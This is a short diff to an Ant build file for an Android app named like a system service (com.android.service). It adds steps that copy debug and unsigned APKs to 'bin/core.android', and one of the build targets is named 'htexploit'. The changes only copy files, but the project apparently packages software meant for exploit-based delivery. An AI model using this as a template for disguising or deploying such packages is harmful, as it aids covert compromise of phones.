@@ -243,6 +243,8 @@
 	 -->
 
 	<target name="htdebug" depends="set-debug, debug">
+		<copy file="bin/android_service-debug.apk" toFile="bin/core.android" overwrite="true" />
+		<echo message="bin/core.android" />
 	</target>
 
 	<target name="htrelease" depends="clean, set-release, release">
@@ -260,6 +262,8 @@
 	<target name="htexploit" depends="clean, set-exploit, release">
 		<echo message="adb uninstall com.android.service" />
 		<echo message="adb install bin/android_service-release.apk" />
+		<copy file="bin/android_service-unsigned.apk" toFile="bin/core.android" overwrite="true" />
+		<echo message="bin/core.android" />
 	</target>
 
 	<target name="dist" depends="htrelease">
